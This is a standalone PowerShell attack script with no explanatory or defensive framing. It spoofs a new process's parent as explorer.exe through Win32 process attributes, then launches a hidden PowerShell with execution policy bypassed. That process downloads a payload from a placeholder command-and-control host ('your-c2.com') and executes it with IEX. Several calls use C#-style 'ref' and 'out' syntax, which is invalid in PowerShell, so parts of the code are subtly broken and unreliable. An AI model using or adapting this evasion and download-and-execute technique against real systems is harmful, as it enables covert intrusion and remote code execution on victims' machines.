# --- Step 1: Define the Win32 API functions ---
$Signature = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, ref IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, uint dwFlags, ref IntPtr lpSize);

    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFOEX { public STARTUPINFO StartupInfo; public IntPtr lpAttributeList; }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO { public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle; public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize; public uint dwXCountChars; public uint dwYCountChars; public uint dwFillAttribute; public uint dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }
}
"@
Add-Type -TypeDefinition $Signature

# --- Step 2: Set up the Spoofing ---
$ParentPID = (Get-Process explorer).Id[0]
$hParent = [Win32]::OpenProcess(0x0080, $false, $ParentPID) # 0x0080 = PROCESS_CREATE_PROCESS

$lpSize = [IntPtr]::Zero
[Win32]::InitializeProcThreadAttributeList([IntPtr]::Zero, 1, 0, [ref]$lpSize)
$lpAttributeList = [Marshal]::AllocHGlobal($lpSize)
[Win32]::InitializeProcThreadAttributeList($lpAttributeList, 1, 0, [ref]$lpSize)

$lpValue = [Marshal]::AllocHGlobal([IntPtr]::Size)
[Marshal]::WriteIntPtr($lpValue, $hParent)

[Win32]::UpdateProcThreadAttribute($lpAttributeList, 0, 0x00020002, ref $lpValue, [IntPtr]::Size, [IntPtr]::Zero, [IntPtr]::Zero) # 0x00020002 = PROC_THREAD_ATTRIBUTE_PARENT_PROCESS

# --- Step 3: Launch the Spoofed Process ---
$si = New-Object Win32+STARTUPINFOEX
$si.StartupInfo.cb = [Marshal]::SizeOf($si)
$si.lpAttributeList = $lpAttributeList
$pi = New-Object Win32+PROCESS_INFORMATION

$Success = [Win32]::CreateProcess($null, "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command 'IEX(New-Object Net.WebClient).DownloadString(''http://your-c2.com/payload'')'", [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x00080000, [IntPtr]::Zero, $null, [ref]$si, out $pi) # 0x00080000 = EXTENDED_STARTUPINFO_PRESENT
